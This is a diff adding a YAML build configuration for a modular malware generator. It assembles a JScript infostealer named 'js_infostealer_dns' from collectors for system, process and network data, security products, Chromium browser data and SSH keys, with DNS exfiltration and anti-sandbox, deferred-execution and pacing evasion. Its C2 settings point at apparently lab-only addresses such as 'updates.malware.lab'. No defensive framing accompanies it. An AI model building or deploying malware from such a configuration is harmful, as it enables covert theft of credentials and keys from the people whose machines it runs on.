@@ -1,0 +1,29 @@
+name: js_infostealer_dns
+description: JScript infostealer with DNS exfiltration for restricted networks
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+  - collectors/security_products
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+
+exfil: exfil/dns_exfil
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_DOMAIN: "updates.malware.lab"
+  DNS_SERVER: "10.0.2.2"
